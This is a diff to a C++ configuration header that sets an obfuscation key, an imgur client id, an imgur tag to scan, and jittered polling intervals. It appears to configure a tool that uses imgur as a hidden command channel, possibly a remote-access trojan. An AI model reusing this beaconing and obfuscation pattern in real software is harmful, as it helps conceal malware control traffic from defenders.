@@ -27,8 +27,8 @@ inline unsigned operator "" _sec(unsigned long long int n)  { return static_cast
 inline unsigned operator "" _min(unsigned long long int n)  { return static_cast<unsigned int>(n * 60 * 1000); }
 inline unsigned operator "" _hour(unsigned long long int n) { return static_cast<unsigned int>(n * 60 * 60 * 1000); }
 
-// String. A key used for obfuscating various data.
-#define vr_shared_key "something-random"
+// 64bit integer. A key used for obfuscating various data.
+#define vr_shared_key 0x982147b5bea3f6c2ull
 
 // String. Client id to be used for scanning imgur.
 #define vr_imgur_client_id "546c25a59c58ad7"
@@ -37,7 +37,14 @@ inline unsigned operator "" _hour(unsigned long long int n) { return static_cast
 #define vr_imgur_tag "png"
 
 // Integer. Time between imgur tag queries
-#define vr_imgur_tag_query_time 10_sec
+#define vr_imgur_tag_query_time 15_min
 
 // Integer. Random time added to imgur tag query time
-#define vr_imgur_tag_query_time_jitter 10_sec
+#define vr_imgur_tag_query_time_jitter 1_min
+
+
+// Private variables, do not modify.
+enum vr_mutants : unsigned long long
+{
+    vr_mutant_main_instance = 0x1000,
+};
